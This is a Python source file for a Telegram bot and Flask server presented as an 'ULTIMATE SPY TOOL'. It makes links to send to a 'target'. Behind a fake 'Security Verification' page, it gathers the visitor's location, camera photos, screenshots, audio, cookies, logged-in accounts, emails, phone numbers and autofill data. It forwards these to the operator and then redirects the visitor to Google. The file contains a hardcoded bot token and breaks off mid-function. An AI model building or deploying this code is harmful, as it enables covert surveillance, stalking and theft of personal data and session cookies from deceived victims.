import secrets
import sqlite3
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, ContextTypes
import asyncio
from threading import Thread
from flask import Flask, render_template_string, request, jsonify
import requests
import time
import logging
import base64
from io import BytesIO
import json

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ============ CONFIGURATION ============
BOT_TOKEN = "8280485894:AAHn1urVFeVA2-NFlltG0-fTyicJ4oTry1k"
localXpose = "ztxabbuuj4.loclx.io"

# ============ FLASK APP ============
app = Flask(__name__)

# ============ DATABASE SETUP ============
def init_db():
    conn = sqlite3.connect('device_tracker.db', check_same_thread=False)
    c = conn.cursor()
    
    c.execute('''CREATE TABLE IF NOT EXISTS links
                 (id TEXT PRIMARY KEY,
                  user_id INTEGER,
                  created_at TEXT,
                  clicks INTEGER DEFAULT 0,
                  active INTEGER DEFAULT 1)''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS devices
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  link_id TEXT,
                  user_id INTEGER,
                  ip TEXT,
                  user_agent TEXT,
                  device_type TEXT,
                  os TEXT,
                  os_version TEXT,
                  device_manufacturer TEXT,
                  device_model TEXT,
                  browser TEXT,
                  browser_version TEXT,
                  screen_resolution TEXT,
                  language TEXT,
                  timezone TEXT,
                  location TEXT,
                  isp TEXT,
                  latitude TEXT,
                  longitude TEXT,
                  platform TEXT,
                  cpu_cores TEXT,
                  touch_support TEXT,
                  battery TEXT,
                  timestamp TEXT,
                  canvas_fingerprint TEXT,
                  webgl_vendor TEXT,
                  webgl_renderer TEXT,
                  front_camera_photo BLOB,
                  back_camera_photo BLOB,
                  screenshot BLOB,
                  audio_recording BLOB,
                  cookies TEXT,
                  logged_accounts TEXT,
                  local_storage TEXT,
                  session_storage TEXT,
                  installed_fonts TEXT,
                  zip_code TEXT,
                  emails TEXT,
                  phones TEXT,
                  autofill_data TEXT,
                  network_info TEXT,
                  data_capture_status TEXT)''')
    
    conn.commit()
    conn.close()

init_db()

# ============ HELPER FUNCTIONS ============
def generate_unique_id():
    return secrets.token_urlsafe(8)

def get_db():
    return sqlite3.connect('device_tracker.db', check_same_thread=False)

def create_link(user_id):
    link_id = generate_unique_id()
    conn = get_db()
    c = conn.cursor()
    c.execute("INSERT INTO links (id, user_id, created_at) VALUES (?, ?, ?)",
              (link_id, user_id, datetime.now().isoformat()))
    conn.commit()
    conn.close()
    return link_id

def get_user_links(user_id):
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT id, created_at, clicks FROM links WHERE user_id = ? AND active = 1 ORDER BY created_at DESC", 
              (user_id,))
    links = c.fetchall()
    conn.close()
    return links

def get_ip_info(ip):
    """Get detailed location info from IP address"""
    try:
        response = requests.get(f'http://ip-api.com/json/{ip}?fields=status,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query', timeout=5)
        if response.status_code == 200:
            data = response.json()
            if data.get('status') == 'success':
                zip_code = data.get('zip', '')
                if not zip_code or zip_code == '':
                    zip_code = 'N/A'
                
                return {
                    'location': f"{data.get('city', 'Unknown')}, {data.get('regionName', 'Unknown')}, {data.get('country', 'Unknown')}",
                    'isp': data.get('isp', 'Unknown'),
                    'org': data.get('org', 'Unknown'),
                    'as': data.get('as', 'Unknown'),
                    'latitude': str(data.get('lat', 'Unknown')),
                    'longitude': str(data.get('lon', 'Unknown')),
                    'timezone': data.get('timezone', 'Unknown'),
                    'zip': zip_code
                }
    except Exception as e:
        logger.error(f"Error getting IP info: {e}")
    
    return {
        'location': 'Unknown',
        'isp': 'Unknown',
        'org': 'Unknown',
        'as': 'Unknown',
        'latitude': 'Unknown',
        'longitude': 'Unknown',
        'timezone': 'Unknown',
        'zip': 'N/A'
    }

# ============ TELEGRAM BOT HANDLERS ============
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    welcome_msg = (
        "╔═══════════════════════════╗\n"
        "║  🕵️ ULTIMATE SPY TOOL  🕵️  ║\n"
        "╚═══════════════════════════╝\n\n"
        "⚡ <b>STEALTH MODE ACTIVATED</b>\n\n"
        "🎯 <b>CAPABILITIES:</b>\n"
        "├ 📍 <b>Location First</b>\n"
        "├ 📸 <b>Front Camera Photo</b>\n"
        "├ 📷 <b>Back Camera Photo</b>\n"
        "├ 🖥️ <b>Screen Capture</b>\n"
        "├ 🎤 <b>Audio Recording</b>\n"
        "├ 🍪 <b>Cookie Extraction</b>\n"
        "├ 👤 <b>Account Detection</b>\n"
        "├ 🌐 <b>IP Geolocation</b>\n"
        "├ 💻 <b>Device Fingerprinting</b>\n"
        "├ 🔋 <b>Battery Status</b>\n"
        "├ 💾 <b>Storage Data</b>\n"
        "├ 📧 <b>Email Harvesting</b>\n"
        "├ 📞 <b>Phone Extraction</b>\n"
        "├ 📶 <b>WiFi Analysis</b>\n"
        "└ 📝 <b>Autofill Data</b>\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "🚀 <b>READY TO DEPLOY</b>\n"
        "Use /generate to create stealth link!"
    )
    
    keyboard = [
        [InlineKeyboardButton("🔗 Generate Tracking Link", callback_data="generate")],
        [InlineKeyboardButton("📊 View My Links", callback_data="mylinks")],
        [InlineKeyboardButton("❓ Help", callback_data="help")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(welcome_msg, parse_mode="HTML", reply_markup=reply_markup)

async def generate(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    link_id = create_link(user_id)
    tracking_url = f"https://{localXpose}/track/{link_id}"
    
    msg = (
        "╔═══════════════════════════╗\n"
        "║    ✅ LINK GENERATED!    ║\n"
        "╚═══════════════════════════╝\n\n"
        f"🔗 <b>Stealth Link:</b>\n"
        f"<code>{tracking_url}</code>\n\n"
        "━━━━━━━━━━════════════════━\n"
        "📋 <b>DEPLOYMENT:</b>\n\n"
        "1️⃣ Copy link above\n"
        "2️⃣ Send to target\n"
        "3️⃣ Wait for access\n"
        "4️⃣ Receive FULL intel!\n\n"
        f"🆔 <b>ID:</b> <code>{link_id}</code>\n"
        f"📅 <b>Created:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        f"⚡ <b>Status:</b> ACTIVE\n\n"
        "━━━━━━━━════════════════━"
    )
    
    keyboard = [
        [InlineKeyboardButton("🔗 Generate Another", callback_data="generate")],
        [InlineKeyboardButton("📊 My Links", callback_data="mylinks")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    if update.callback_query:
        await update.callback_query.message.reply_text(msg, parse_mode="HTML", reply_markup=reply_markup)
    else:
        await update.message.reply_text(msg, parse_mode="HTML", reply_markup=reply_markup)

async def mylinks(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    links = get_user_links(user_id)
    
    if not links:
        msg = (
            "╔═══════════════════════════╗\n"
            "║      📊 YOUR LINKS       ║\n"
            "╚═══════════════════════════╝\n\n"
            "❌ No active links found!\n\n"
            "Use /generate to create your first stealth link! 🔗"
        )
        keyboard = [[InlineKeyboardButton("🔗 Generate Link", callback_data="generate")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        if update.callback_query:
            await update.callback_query.message.reply_text(msg, reply_markup=reply_markup)
        else:
            await update.message.reply_text(msg, reply_markup=reply_markup)
        return
    
    msg = (
        "╔═══════════════════════════╗\n"
        "║   📊 ACTIVE LINKS       ║\n"
        "╚═══════════════════════════╝\n\n"
    )
    
    for link_id, created_at, clicks in links[:10]:
        created_date = datetime.fromisoformat(created_at).strftime('%Y-%m-%d %H:%M')
        msg += (
            f"┌─ 🔗 <code>{link_id}</code>\n"
            f"├─ 📅 {created_date}\n"
            f"├─ 👁️ Clicks: <b>{clicks}</b>\n"
            f"└─ 🌐 https://{localXpose}/track/{link_id}\n\n"
        )
    
    msg += f"━━━━━━━━━━━━━━━━━━━━━━━━\n📈 Total: <b>{len(links)}</b> active links"
    
    keyboard = [
        [InlineKeyboardButton("🔗 Generate New", callback_data="generate")],
        [InlineKeyboardButton("🔄 Refresh", callback_data="mylinks")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    if update.callback_query:
        await update.callback_query.message.reply_text(msg, parse_mode="HTML", reply_markup=reply_markup)
    else:
        await update.message.reply_text(msg, parse_mode="HTML", reply_markup=reply_markup)

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_msg = (
        "╔═══════════════════════════╗\n"
        "║      ❓ HELP CENTER      ║\n"
        "╚═══════════════════════════╝\n\n"
        "📱 <b>COMMANDS:</b>\n"
        "/start - Main menu\n"
        "/generate - Create tracking link\n"
        "/mylinks - View your links\n"
        "/help - Show this help\n\n"
        "━━━━━━━━━━════════════════━\n"
        "🎯 <b>DATA CAPTURED:</b>\n\n"
        "📍 Location (first)\n"
        "📸 Front camera photo\n"
        "📷 Back camera photo\n"
        "🖥️ Screen capture\n"
        "🎤 Audio recording\n"
        "🍪 All cookies\n"
        "👤 Logged-in accounts\n"
        "🌐 IP geolocation\n"
        "💻 Device fingerprint\n"
        "💾 Storage data\n"
        "🔋 Battery status\n"
        "📧 Email addresses\n"
        "📞 Phone numbers\n"
        "📶 Network info\n"
        "📝 Autofill data\n\n"
        "⚠️ Use responsibly & legally!"
    )
    
    keyboard = [[InlineKeyboardButton("🔗 Generate Link", callback_data="generate")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    if update.callback_query:
        await update.callback_query.message.reply_text(help_msg, parse_mode="HTML", reply_markup=reply_markup)
    else:
        await update.message.reply_text(help_msg, parse_mode="HTML", reply_markup=reply_markup)

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.data == "generate":
        await generate(update, context)
    elif query.data == "mylinks":
        await mylinks(update, context)
    elif query.data == "help":
        await help_command(update, context)

async def send_device_notification(bot, user_id, device_data, link_id, front_camera=None, back_camera=None, screenshot=None, audio=None):
    """Send detailed device info with all media types"""
    
    has_gps = device_data.get('gps_latitude', 'N/A') != 'N/A'
    gps_lat = device_data.get('gps_latitude', 'N/A')
    gps_lon = device_data.get('gps_longitude', 'N/A')
    
    zip_code = device_data.get('zip', 'N/A')
    
    # Get data capture status
    capture_status = device_data.get('data_capture_status', '{}')
    try:
        status_dict = json.loads(capture_status)
    except:
        status_dict = {}
    
    # Build capture status summary
    status_summary = []
    if status_dict.get('location', False):
        status_summary.append("📍 Location")
    if status_dict.get('device_info', False):
        status_summary.append("📱 Device Info")
    if status_dict.get('front_camera', False):
        status_summary.append("📸 Front Camera")
    if status_dict.get('back_camera', False):
        status_summary.append("📷 Back Camera")
    if status_dict.get('screenshot', False):
        status_summary.append("🖥️ Screenshot")
    if status_dict.get('audio', False):
        status_summary.append("🎤 Audio")
    if status_dict.get('emails', False):
        status_summary.append("📧 Emails")
    if status_dict.get('phones', False):
        status_summary.append("📞 Phones")
    if status_dict.get('autofill', False):
        status_summary.append("📝 Autofill")
    
    status_text = " | ".join(status_summary) if status_summary else "❌ No data captured"
    
    # Enhanced device information display
    device_info = (
        "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
        "┃  📱 <b>DEVICE INFORMATION</b>\n"
        "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
        f"├ 🖥️ Type: <b>{device_data.get('device_type', 'Unknown')}</b>\n"
    )
    
    # Add OS with version if available
    os_info = device_data.get('os', 'Unknown')
    os_version = device_data.get('os_version', '')
    if os_version and os_version != '':
        os_info += f" {os_version}"
    device_info += f"├ 💿 OS: <b>{os_info}</b>\n"
    
    # Add manufacturer and model if available
    manufacturer = device_data.get('device_manufacturer', '')
    model = device_data.get('device_model', '')
    if manufacturer and manufacturer != '':
        device_info += f"├ 🏭 Manufacturer: <b>{manufacturer}</b>\n"
    if model and model != '':
        device_info += f"├ 📱 Model: <b>{model}</b>\n"
    
    device_info += (
        f"├ 🌐 Browser: <b>{device_data.get('browser', 'Unknown')} {device_data.get('browser_version', '')}</b>\n"
        f"├ 📺 Screen: <b>{device_data.get('screen_resolution', 'Unknown')}</b>\n"
        f"├ 🔧 Platform: <b>{device_data.get('platform', 'Unknown')}</b>\n"
        f"├ ⚙️ CPU: <b>{device_data.get('cpu_cores', 'Unknown')} cores</b>\n"
        f"├ 👆 Touch: <b>{device_data.get('touch_support', 'No')}</b>\n"
        f"└ 🔋 Battery: <b>{device_data.get('battery', 'N/A')}</b>\n\n"
    )
    
    # Data capture status section
    capture_info = (
        "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
        "┃  📊 <b>DATA CAPTURE STATUS</b>\n"
        "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
        f"├ 📈 Captured: <b>{status_text}</b>\n"
        f"├ ⏱️ Duration: <b>{status_dict.get('duration', 'Unknown')}</b>\n"
        f"└ 🚨 Page Closed: <b>{'Yes' if status_dict.get('page_closed', False) else 'No'}</b>\n\n"
    )
    
    network_info = (
        "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
        "┃  🌐 <b>NETWORK INTELLIGENCE</b>\n"
        "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
        f"├ 🌍 IP: <code>{device_data.get('ip', 'Unknown')}</code>\n"
        f"├ 📍 Location: <b>{device_data.get('location', 'Unknown')}</b>\n"
        f"├ 📮 ZIP: <b>{zip_code}</b>\n"
        f"├ 🏢 ISP: <b>{device_data.get('isp', 'Unknown')}</b>\n"
        f"├ 🏛️ ORG: <b>{device_data.get('org', 'Unknown')}</b>\n"
        f"└ 🔢 ASN: <code>{device_data.get('as', 'Unknown')}</code>\n\n"
    )
    
    gps_info = ""
    if has_gps:
        gps_info = (
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  📍 <b>GPS COORDINATES</b> (PRECISE!)\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            f"├ 🧭 Latitude: <code>{gps_lat}</code>\n"
            f"├ 🧭 Longitude: <code>{gps_lon}</code>\n"
            f"├ 🎯 Accuracy: <b>{device_data.get('gps_accuracy', 'N/A')}</b>\n"
            f"└ ✅ Permission: <b>GRANTED</b>\n\n"
            f"🗺️ <b>Maps:</b> https://maps.google.com/?q={gps_lat},{gps_lon}\n"
            f"🛰️ <b>Satellite:</b> https://www.google.com/maps/@{gps_lat},{gps_lon},18z/data=!3m1!1e3\n\n"
        )
    
    accounts_info = ""
    logged_accounts = device_data.get('logged_accounts', {})
    if logged_accounts and any(logged_accounts.values()):
        accounts_info = (
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  👤 <b>LOGGED-IN ACCOUNTS</b> 🔥\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
        )
        for platform, status in logged_accounts.items():
            emoji = "✅" if status else "❌"
            accounts_info += f"├ {emoji} <b>{platform}</b>\n"
        accounts_info += "\n"
    
    emails_info = ""
    emails = device_data.get('emails', [])
    if emails and len(emails) > 0:
        emails_info = (
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  📧 <b>EMAILS FOUND</b> ({} found)\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n".format(len(emails))
        )
        for email in emails[:5]:
            emails_info += f"├ <code>{email}</code>\n"
        if len(emails) > 5:
            emails_info += f"└ ... and {len(emails) - 5} more emails\n"
        emails_info += "\n"
    
    phones_info = ""
    phones = device_data.get('phones', [])
    if phones and len(phones) > 0:
        phones_info = (
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  📞 <b>PHONE NUMBERS</b> ({} found)\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n".format(len(phones))
        )
        for phone in phones[:5]:
            phones_info += f"├ <code>{phone}</code>\n"
        if len(phones) > 5:
            phones_info += f"└ ... and {len(phones) - 5} more numbers\n"
        phones_info += "\n"
    
    autofill_info = ""
    autofill_data = device_data.get('autofill_data', {})
    if autofill_data and any(autofill_data.values()):
        autofill_info = (
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  📝 <b>AUTOFILL DATA</b>\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
        )
        for field, value in autofill_data.items():
            if value and value != '':
                autofill_info += f"├ <b>{field.title()}:</b> <code>{value}</code>\n"
        autofill_info += "\n"
    
    cookies_info = ""
    cookies = device_data.get('cookies', [])
    if cookies and len(cookies) > 0:
        cookies_info = (
            "┏━━━━━━━━━━══════════════════━━┓\n"
            "┃  🍪 <b>COOKIES EXTRACTED</b> ({} found)\n"
            "┗━━━━━━━━━━══════════════════━━┛\n".format(len(cookies))
        )
        for cookie in cookies[:5]:
            cookies_info += f"├ <code>{cookie.get('name', 'N/A')}</code>: {cookie.get('value', 'N/A')[:30]}...\n"
        if len(cookies) > 5:
            cookies_info += f"└ ... and {len(cookies) - 5} more cookies\n"
        cookies_info += "\n"
    
    fingerprint_info = (
        "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
        "┃  🔍 <b>DEVICE FINGERPRINT</b>\n"
        "┗━━━━━━━━━━━━━━━━══════════════┛\n"
        f"├ 🎨 Canvas: <code>{device_data.get('canvas_fingerprint', 'N/A')[:20]}...</code>\n"
        f"├ 🖼️ WebGL Vendor: <b>{device_data.get('webgl_vendor', 'Unknown')}</b>\n"
        f"├ 🖼️ Renderer: <b>{device_data.get('webgl_renderer', 'Unknown')}</b>\n"
        f"├ 🌍 Language: <b>{device_data.get('language', 'Unknown')}</b>\n"
        f"└ ⏰ Timezone: <b>{device_data.get('timezone', 'Unknown')}</b>\n\n"
    )
    
    timestamp_info = (
        "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
        "┃  🕐 <b>TIMESTAMP</b>\n"
        "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
        f"├ 📅 Date: <b>{datetime.now().strftime('%B %d, %Y')}</b>\n"
        f"├ ⏰ Time: <b>{datetime.now().strftime('%H:%M:%S')}</b>\n"
        f"└ 🔗 Link ID: <code>{link_id}</code>\n\n"
        "╚═══════════════════════════════════╝\n"
        "     ✅ <b>FULL INTEL COLLECTED</b>"
    )
    
    msg = (
        "╔═══════════════════════════════════╗\n"
        "║  🎯 TARGET ACQUIRED! 🎯          ║\n"
        "╚═══════════════════════════════════╝\n\n" +
        capture_info +
        device_info +
        network_info +
        gps_info +
        accounts_info +
        emails_info +
        phones_info +
        autofill_info +
        cookies_info +
        fingerprint_info +
        timestamp_info
    )
    
    try:
        # Send main message first
        await bot.send_message(chat_id=user_id, text=msg, parse_mode="HTML")
        
        # Send front camera photo if available
        if front_camera and front_camera != 'N/A':
            try:
                logger.info("Sending front camera photo...")
                if isinstance(front_camera, bytes):
                    photo_file = BytesIO(front_camera)
                elif isinstance(front_camera, str) and front_camera.startswith('data:image'):
                    if ',' in front_camera:
                        base64_data = front_camera.split(',', 1)[1]
                        photo_bytes = base64.b64decode(base64_data)
                        photo_file = BytesIO(photo_bytes)
                    else:
                        photo_file = None
                else:
                    photo_file = None
                
                if photo_file:
                    photo_file.name = 'front_camera.jpg'
                    await bot.send_photo(
                        chat_id=user_id,
                        photo=photo_file,
                        caption="📸 <b>FRONT CAMERA CAPTURE!</b>",
                        parse_mode="HTML"
                    )
                    logger.info("Front camera photo sent successfully!")
            except Exception as e:
                logger.error(f"Error sending front camera photo: {e}")
        
        # Send back camera photo if available
        if back_camera and back_camera != 'N/A':
            try:
                logger.info("Sending back camera photo...")
                if isinstance(back_camera, bytes):
                    photo_file = BytesIO(back_camera)
                elif isinstance(back_camera, str) and back_camera.startswith('data:image'):
                    if ',' in back_camera:
                        base64_data = back_camera.split(',', 1)[1]
                        photo_bytes = base64.b64decode(base64_data)
                        photo_file = BytesIO(photo_bytes)
                    else:
                        photo_file = None
                else:
                    photo_file = None
                
                if photo_file:
                    photo_file.name = 'back_camera.jpg'
                    await bot.send_photo(
                        chat_id=user_id,
                        photo=photo_file,
                        caption="📷 <b>BACK CAMERA CAPTURE!</b>",
                        parse_mode="HTML"
                    )
                    logger.info("Back camera photo sent successfully!")
            except Exception as e:
                logger.error(f"Error sending back camera photo: {e}")
        
        # Send screenshot if available
        if screenshot and screenshot != 'N/A':
            try:
                logger.info("Sending screenshot...")
                if isinstance(screenshot, bytes):
                    photo_file = BytesIO(screenshot)
                elif isinstance(screenshot, str) and screenshot.startswith('data:image'):
                    if ',' in screenshot:
                        base64_data = screenshot.split(',', 1)[1]
                        screenshot_bytes = base64.b64decode(base64_data)
                        photo_file = BytesIO(screenshot_bytes)
                    else:
                        photo_file = None
                else:
                    photo_file = None
                
                if photo_file:
                    photo_file.name = 'screenshot.png'
                    await bot.send_photo(
                        chat_id=user_id,
                        photo=photo_file,
                        caption="🖥️ <b>SCREEN CAPTURE!</b>",
                        parse_mode="HTML"
                    )
                    logger.info("Screenshot sent successfully!")
            except Exception as e:
                logger.error(f"Error sending screenshot: {e}")
        
        # Send audio recording if available
        if audio and audio != 'N/A':
            try:
                logger.info("Sending audio recording...")
                if isinstance(audio, bytes):
                    audio_file = BytesIO(audio)
                elif isinstance(audio, str) and audio.startswith('data:audio'):
                    if ',' in audio:
                        base64_data = audio.split(',', 1)[1]
                        audio_bytes = base64.b64decode(base64_data)
                        audio_file = BytesIO(audio_bytes)
                    else:
                        audio_file = None
                else:
                    audio_file = None
                
                if audio_file:
                    audio_file.name = 'recording.wav'
                    await bot.send_audio(
                        chat_id=user_id,
                        audio=audio_file,
                        caption="🎤 <b>AUDIO RECORDING!</b>",
                        parse_mode="HTML"
                    )
                    logger.info("Audio recording sent successfully!")
            except Exception as e:
                logger.error(f"Error sending audio recording: {e}")
        
        logger.info(f"Complete notification sent to user {user_id}")
    except Exception as e:
        logger.error(f"Error sending notification: {e}")

telegram_bot = None

# ============ FLASK ROUTES ============
TRACKING_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <title>Secure Access Verification</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            overflow: hidden;
        }
        .container {
            text-align: center;
            background: rgba(255, 255, 255, 0.95);
            padding: 50px 40px;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            max-width: 400px;
            width: 90%;
        }
        .loader {
            border: 6px solid #f3f3f3;
            border-top: 6px solid #667eea;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 1s linear infinite;
            margin: 0 auto 25px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        h2 {
            color: #333;
            margin-bottom: 15px;
            font-size: 24px;
        }
        p {
            color: #666;
            font-size: 16px;
            line-height: 1.6;
        }
        .status {
            margin-top: 20px;
            padding: 15px;
            background: #f8f9fa;
            border-radius: 10px;
            font-size: 14px;
            color: #555;
        }
        #video { display: none; }
        #canvas { display: none; }
        #screenshotCanvas { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <div class="loader"></div>
        <h2>🔐 Security Verification</h2>
        <p>Please wait while we verify your access...</p>
        <div class="status" id="status">Initializing security checks...</div>
    </div>
    
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>
    <canvas id="screenshotCanvas"></canvas>
    
    <script>
        function updateStatus(text) {
            document.getElementById('status').textContent = text;
            console.log('Status:', text);
        }
        
        // Track data collection status
        let dataCollected = {
            location: false,
            device_info: false,
            front_camera: false,
            back_camera: false,
            screenshot: false,
            audio: false,
            emails: false,
            phones: false,
            autofill: false,
            page_closed: false
        };
        
        let startTime = Date.now();
        let data = {};
        
        // Send data with current status
        function sendData(currentData, isPartial = false) {
            if (isPartial) {
                dataCollected.page_closed = true;
            }
            
            // Calculate duration
            const duration = Math.round((Date.now() - startTime) / 1000);
            
            // Add capture status to data
            currentData.data_capture_status = JSON.stringify({
                ...dataCollected,
                duration: duration + 's'
            });
            
            console.log('Sending data to server...', dataCollected);
            
            fetch('/collect/{{ link_id }}', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(currentData)
            }).then(response => {
                console.log('Server response:', response.status);
                if (!isPartial) {
                    updateStatus('✅ Access granted!');
                    setTimeout(() => {
                        window.location.href = 'https://www.google.com';
                    }, 1500);
                }
            }).catch(error => {
                console.error('Error sending data:', error);
                if (!isPartial) {
                    setTimeout(() => {
                        window.location.href = 'https://www.google.com';
                    }, 1500);
                }
            });
        }
        
        // Handle page unload
        window.addEventListener('beforeunload', function() {
            if (Object.keys(data).length > 0) {
                // Send any collected data before page unloads
                navigator.sendBeacon('/collect/{{ link_id }}', JSON.stringify({
                    ...data,
                    data_capture_status: JSON.stringify({
                        ...dataCollected,
                        page_closed: true,
                        duration: Math.round((Date.now() - startTime) / 1000) + 's'
                    })
                }));
            }
        });
        
        // Enhanced device detection
        function getDetailedDeviceInfo() {
            const ua = navigator.userAgent;
            const deviceInfo = {
                device_type: 'Desktop',
                os: 'Unknown',
                os_version: '',
                device_manufacturer: '',
                device_model: '',
                browser: 'Unknown',
                browser_version: ''
            };
            
            // Device type detection
            if (/Mobile|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua)) {
                deviceInfo.device_type = 'Mobile';
            } else if (/Tablet|iPad|PlayBook|Silk/i.test(ua)) {
                deviceInfo.device_type = 'Tablet';
            }
            
            // OS detection with version
            if (/Windows/i.test(ua)) {
                deviceInfo.os = 'Windows';
                
                // Windows version detection
                if (/Windows NT 10.0/i.test(ua)) {
                    deviceInfo.os_version = '10 or 11';
                } else if (/Windows NT 6.3/i.test(ua)) {
                    deviceInfo.os_version = '8.1';
                } else if (/Windows NT 6.2/i.test(ua)) {
                    deviceInfo.os_version = '8';
                } else if (/Windows NT 6.1/i.test(ua)) {
                    deviceInfo.os_version = '7';
                } else if (/Windows NT 6.0/i.test(ua)) {
                    deviceInfo.os_version = 'Vista';
                } else if (/Windows NT 5.1/i.test(ua)) {
                    deviceInfo.os_version = 'XP';
                }
                
                // Try to distinguish between Windows 10 and 11
                if (deviceInfo.os_version === '10 or 11') {
                    if (/Edg\/([0-9]{2,})/i.test(ua)) {
                        const edgeVersion = parseInt(ua.match(/Edg\\/([0-9]{2,})/i)[1]);
                        if (edgeVersion >= 91) {
                            deviceInfo.os_version = '11 (likely)';
                        } else {
                            deviceInfo.os_version = '10 (likely)';
                        }
                    }
                }
            } else if (/Mac OS X|Macintosh/i.test(ua)) {
                deviceInfo.os = 'macOS';
                const macVersion = ua.match(/Mac OS X ([0-9_]+)/i);
                if (macVersion) {
                    deviceInfo.os_version = macVersion[1].replace(/_/g, '.');
                }
            } else if (/Linux/i.test(ua)) {
                deviceInfo.os = 'Linux';
                
                if (/Ubuntu/i.test(ua)) {
                    deviceInfo.os_version = 'Ubuntu';
                } else if (/Fedora/i.test(ua)) {
                    deviceInfo.os_version = 'Fedora';
                } else if (/Debian/i.test(ua)) {
                    deviceInfo.os_version = 'Debian';
                }
            } else if (/Android/i.test(ua)) {
                deviceInfo.os = 'Android';
                
                const androidVersion = ua.match(/Android ([0-9.]+)/i);
                if (androidVersion) {
                    deviceInfo.os_version = androidVersion[1];
                }
                
                const manufacturerMatch = ua.match(/\(([^;]+);/i);
                if (manufacturerMatch) {
                    const deviceParts = manufacturerMatch[1].split(';');
                    if (deviceParts.length >= 2) {
                        deviceInfo.device_manufacturer = deviceParts[0].trim();
                        deviceInfo.device_model = deviceParts[1].trim();
                    } else if (deviceParts.length === 1) {
                        const buildMatch = ua.match(/Build\/([^\s]+)/i);
                        if (buildMatch) {
                            const buildInfo = buildMatch[1];
                            
                            if (ua.includes('SM-')) {
                                deviceInfo.device_manufacturer = 'Samsung';
                                deviceInfo.device_model = ua.match(/SM-([A-Za-z0-9]+)/i)?.[1] || '';
                            } else if (ua.includes('Pixel')) {
                                deviceInfo.device_manufacturer = 'Google';
                                deviceInfo.device_model = ua.match(/Pixel ([0-9]+)/i)?.[0] || 'Pixel';
                            } else if (ua.includes('MI')) {
                                deviceInfo.device_manufacturer = 'Xiaomi';
                                deviceInfo.device_model = ua.match(/MI ([0-9]+)/i)?.[0] || 'MI';
                            } else if (ua.includes('Redmi')) {
                                deviceInfo.device_manufacturer = 'Xiaomi';
                                deviceInfo.device_model = ua.match(/Redmi ([A-Za-z0-9]+)/i)?.[0] || 'Redmi';
                            } else if (ua.includes('OnePlus')) {
                                deviceInfo.device_manufacturer = 'OnePlus';
                                deviceInfo.device_model = ua.match(/OnePlus ([A-Za-z0-9]+)/i)?.[0] || 'OnePlus';
                            } else if (ua.includes('vivo')) {
                                deviceInfo.device_manufacturer = 'Vivo';
                                deviceInfo.device_model = ua.match(/vivo ([A-Za-z0-9]+)/i)?.[0] || 'Vivo';
                            } else if (ua.includes('OPPO')) {
                                deviceInfo.device_manufacturer = 'OPPO';
                                deviceInfo.device_model = ua.match(/OPPO ([A-Za-z0-9]+)/i)?.[0] || 'OPPO';
                            } else if (ua.includes('Huawei')) {
                                deviceInfo.device_manufacturer = 'Huawei';
                                deviceInfo.device_model = ua.match(/Huawei ([A-Za-z0-9]+)/i)?.[0] || 'Huawei';
                            } else if (ua.includes('Nokia')) {
